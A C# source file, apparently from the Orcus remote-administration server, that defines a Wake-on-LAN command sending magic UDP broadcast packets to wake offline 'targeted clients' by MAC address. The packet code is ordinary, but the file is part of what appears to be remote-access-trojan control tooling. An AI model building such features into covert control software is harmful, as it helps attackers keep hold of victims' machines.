using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

namespace Orcus.Server.Core.DynamicCommands.SpecialCommands
{
    public class WakeOnLanSpecialCommand : SpecialCommand
    {
        public override Guid CommandId { get; } = new Guid(0xd25b1de9, 0xef0b, 0x1f49, 0xb3, 0xe1, 0x14, 0x11, 0x13,
            0xdf, 0xd3, 0xef);

        public override ValidClients ValidClients { get; } = ValidClients.OfflineOnly;

        public override List<int> Execute(byte[] parameter, List<TargetedClient> clients, ITcpServerInfo tcpServerInfo)
        {
            var sentList = new List<int>();
            foreach (var targetedClient in clients)
            {
                if (targetedClient.ClientInformation.MacAddressBytes != null)
                {
                    WakeOnLan(targetedClient.ClientInformation.MacAddressBytes);
                    sentList.Add(targetedClient.Id);
                }
            }

            return sentList;
        }

        //Source: https://dotnet-snippets.de/snippet/wake-on-lan/608
        private static void WakeOnLan(byte[] mac)
        {
            // WOL packet is sent over UDP 255.255.255.0:40000.
            UdpClient client = new UdpClient();
            client.Connect(IPAddress.Broadcast, 40000);

            // WOL packet contains a 6-bytes trailer and 16 times a 6-bytes sequence containing the MAC address.
            byte[] packet = new byte[17 * 6];

            // Trailer of 6 times 0xFF.
            for (int i = 0; i < 6; i++)
                packet[i] = 0xFF;

            // Body of magic packet contains 16 times the MAC address.
            for (int i = 1; i <= 16; i++)
                for (int j = 0; j < 6; j++)
                    packet[i * 6 + j] = mac[j];

            // Send WOL packet.
            client.Send(packet, packet.Length);
        }
    }
}